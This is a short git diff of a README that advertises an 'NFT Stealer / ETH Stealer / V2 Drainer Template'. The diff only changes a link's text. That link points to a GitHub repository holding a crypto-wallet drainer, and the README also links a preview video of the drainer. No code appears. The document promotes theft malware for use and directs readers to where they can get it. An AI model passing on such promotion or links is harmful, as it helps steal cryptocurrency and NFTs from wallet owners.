@@ -5,7 +5,7 @@
 
 ---
 ## 💧 NFT Stealer / ETH Stealer / V2 Drainer Template
-#### for fixed version, use the [V1](https://github.com/0x32Moon/NFT-Crypto-Drainer)
+#### for fixed version, use the V1 [(cick here)](https://github.com/0x32Moon/NFT-Crypto-Drainer)
 ### <center>❄️ Preview of the Drainer
 [![Preview - Click to play](https://cdn.discordapp.com/attachments/987748605542666381/988246810978041856/Photoshop_vonKEsem5A.png)](https://cdn.discordapp.com/attachments/914551334680797195/986413868505002004/drainer.mp4)
 Click to play
